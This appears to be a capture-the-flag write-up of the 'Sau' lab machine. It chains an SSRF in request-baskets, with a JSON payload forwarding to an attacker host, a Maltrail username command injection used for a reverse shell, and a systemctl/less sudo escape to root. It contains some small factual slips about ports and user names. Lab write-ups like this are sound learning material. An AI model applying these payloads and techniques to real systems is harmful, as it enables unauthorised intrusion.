## Enumeration
Scanning sau.htb showed two open ports, 22 and 55555 and two filtered ports 80 and 8338. Receiving a filtered response indicates, that the requests actively got rejected.

```
On Port 80 a website is hosted running request-basket version 1.2.1, which is a service to collect arbitrary HTTP requests and inspect them. Researching the version online, showed that this version is vulnerable to [server side request forgery][SSRF].

This can be proven by creating a new basket with a POST request to `http://sau.htb:55555/api/baskets/<name>` using the following options. 
```
{
  "forward_url": "http://<attacker-ip>:4444/",
  "proxy_response": true,
  "insecure_tls": false,
  "expand_path": true,
  "capacity": 250
}
```
If we now start a web server on the attacker and try to access the newly created basket on `http://sau.htb:55555/<name>` we see the content from our webserver, which received the forwarded request from request-basket.

This information may now be used to access websites, which may only be accessible from the host itself. Since there were two filtered ports, I tried to create a new forwarding basket for both of them. Port 8338 hosted a tool called Maltrail version 0.53 and Port 80 just seemed to be a proxy to port 8338. 

## Initial Foothold
Some research showed, that this version of Mailtrail is vulnerable to [remote code execution][MALTRAIL] through an unsanitized parameter `username` in the login page.

By injecting a semicolon character, shell commands may be executed. Through this vulnerability a reverse shell was injected into the host, encoded in base64.

The user puma had the user flag.

```
$ cat user.txt 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

## Privilege Escalation
Running `sudo -l` showed that the logan user is allowed to run systemctl using sudo. 
```
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

The systemctl CLI uses less as a pager, which allows execution of commands and does not drop root permissions immediately. Using this it was possible to open a shell as root.

## Reflection
In the beginning I struggled with accessing the filtered ports over the SSRF vulnerability, because I didn't see the parameter `proxy_response`, which needs to be set to `true` for the basket to actually forward the response from the target web server.After being able to access the filtered ports, the rest was pretty straightforward.
